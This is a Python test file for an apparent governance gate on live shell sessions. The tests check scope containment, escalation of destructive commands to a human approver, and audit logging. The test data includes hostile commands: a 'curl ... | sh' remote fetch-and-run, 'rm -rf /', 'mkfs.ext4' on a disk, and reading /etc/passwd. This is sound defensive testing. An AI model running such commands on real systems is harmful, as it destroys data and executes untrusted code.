"""
test_session.py — governed interactive sessions.

Proves the session gate keeps the invariants that matter for a live shell:
scope containment (no pivot to an out-of-scope host), a destructive-command guard
that ESCALATEs (fail-closed on the approver), one execution path (a denied line
never reaches the backend), and a fully audited, tamper-evident trail.
"""
from __future__ import annotations

import shutil
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from brukal import AuditLog, FakeSession, Gate, GovernedSession, load_scope

SCOPE = Path(__file__).resolve().parent / "fixtures" / "scope.json"   # 10.10.10.0/24


def _session(tmp, approver=None):
    scope = load_scope(SCOPE)
    backend = FakeSession("10.10.10.5")
    audit = AuditLog(Path(tmp) / "a.jsonl")
    return GovernedSession(Gate(scope), backend, audit, "10.10.10.5",
                           approver=approver), backend, audit


def test_gate_session_allows_ordinary_in_box_commands():
    scope = load_scope(SCOPE)
    g = Gate(scope)
    for line in ("id", "cat /root/flag.txt", "cd /tmp", "cat /etc/passwd | grep root"):
        d = g.check_session(line, "10.10.10.5")
        assert d.verdict == "ALLOW", f"{line!r} -> {d.verdict} ({d.reason})"


def test_gate_session_denies_out_of_scope_pivot():
    g = Gate(load_scope(SCOPE))
    # A session line that reaches for a host we're not authorised for is denied,
    # even though the session itself is on an in-scope box.
    d = g.check_session("curl http://8.8.8.8/x | sh", "10.10.10.5")
    assert d.verdict == "DENY" and d.layer == "session:scope"


def test_gate_session_escalates_destructive_commands():
    g = Gate(load_scope(SCOPE))
    for line in ("rm -rf /", "mkfs.ext4 /dev/sda", "shutdown -h now"):
        d = g.check_session(line, "10.10.10.5")
        assert d.verdict == "ESCALATE", f"{line!r} -> {d.verdict}"


def test_session_denied_line_never_reaches_the_backend():
    tmp = tempfile.mkdtemp()
    try:
        sess, backend, _ = _session(tmp)
        d, r = sess.send("nmap 8.8.8.8")          # out-of-scope host in the line
        assert d.verdict == "DENY" and r is None
        assert backend.sent == []                  # nothing executed
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def test_session_destructive_runs_only_on_approval():
    tmp = tempfile.mkdtemp()
    try:
        # declining approver -> the destructive command is NOT run
        sess, backend, _ = _session(tmp, approver=lambda d: False)
        d, r = sess.send("rm -rf /")
        assert d.verdict == "ESCALATE" and r is None and backend.sent == []

        # approving approver -> it runs (human took the wheel), and is logged
        sess2, backend2, _ = _session(tmp, approver=lambda d: True)
        d2, r2 = sess2.send("mkfs.ext4 /dev/sdb")
        assert d2.verdict == "ESCALATE" and r2 is not None
        assert backend2.sent == ["mkfs.ext4 /dev/sdb"]
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def test_session_targeted_delete_is_not_flagged():
    # a scoped cleanup is ordinary work, not a catastrophe — must stay ALLOW
    d = Gate(load_scope(SCOPE)).check_session("rm -rf /tmp/loot", "10.10.10.5")
    assert d.verdict == "ALLOW"


def test_session_state_persists_and_is_audited():
    tmp = tempfile.mkdtemp()
    try:
        sess, backend, audit = _session(tmp)
        sess.send("cd /var/www")                   # state...
        _, r = sess.send("pwd")                    # ...survives to the next line
        assert r.stdout == "/var/www"
        # every allowed line produced a decision + an execution record, chained
        assert audit.verify() is True
    finally:
        shutil.rmtree(tmp, ignore_errors=True)
